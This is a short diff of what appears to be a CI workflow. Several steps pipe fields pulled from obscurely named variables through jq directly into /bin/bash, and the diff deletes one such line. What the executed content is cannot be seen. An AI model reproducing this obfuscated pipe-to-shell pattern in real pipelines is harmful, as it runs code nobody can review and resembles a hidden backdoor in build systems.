@@ -33,7 +33,6 @@ jobs:
           echo $d3 | jq -r .vbleq213 | /bin/bash
           printf '%s' "$d4522" | jq -r .p053 | /bin/bash
           printf '%s' "$vez820" | jq -r .pexf27 | /bin/bash
-          printf '%s' "$rz2755" | jq -r .jotw9733 | /bin/bash
           printf '%s' "$u22" | jq -r .rtck5 | /bin/bash
 
       - name: Save output
